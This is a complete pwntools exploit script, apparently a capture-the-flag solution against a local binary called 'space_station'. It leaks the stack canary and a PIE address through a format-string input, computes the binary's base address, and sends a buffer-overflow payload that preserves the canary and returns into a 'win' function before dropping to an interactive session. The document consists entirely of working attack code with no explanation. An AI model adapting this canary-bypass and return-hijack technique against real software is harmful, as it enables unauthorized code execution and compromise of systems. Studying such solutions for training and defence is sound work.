from pwn import *

elf = context.binary = ELF("./space_station", checksec=False)
p = process(elf.path)

CANARY_IDX = 15
PIE_IDX = 25
OFFSET = 72
RET_OFF = 0x101a

# leak canary + PIE address
p.recvuntil(b"Enter your astronaut ID: ")
p.sendline(f"%{CANARY_IDX}$lx.%{PIE_IDX}$p".encode())

canary_leak, pie_leak = p.recvline().strip().split(b".")

canary = int(canary_leak, 16)
main_leak = int(pie_leak, 16)

# calculate PIE base
elf.address = main_leak - elf.sym.main

ret = elf.address + RET_OFF
win = elf.sym.win

log.info(f"Canary: {canary:#x}")
log.info(f"PIE base: {elf.address:#x}")
log.info(f"ret: {ret:#x}")
log.info(f"win: {win:#x}")

# overflow
payload = flat(
    b"A" * OFFSET,
    p64(canary),
    b"B" * 8,
    p64(ret),
    p64(win)
)

p.recvuntil(b"Submit your mission log: ")
p.send(payload)

p.interactive()

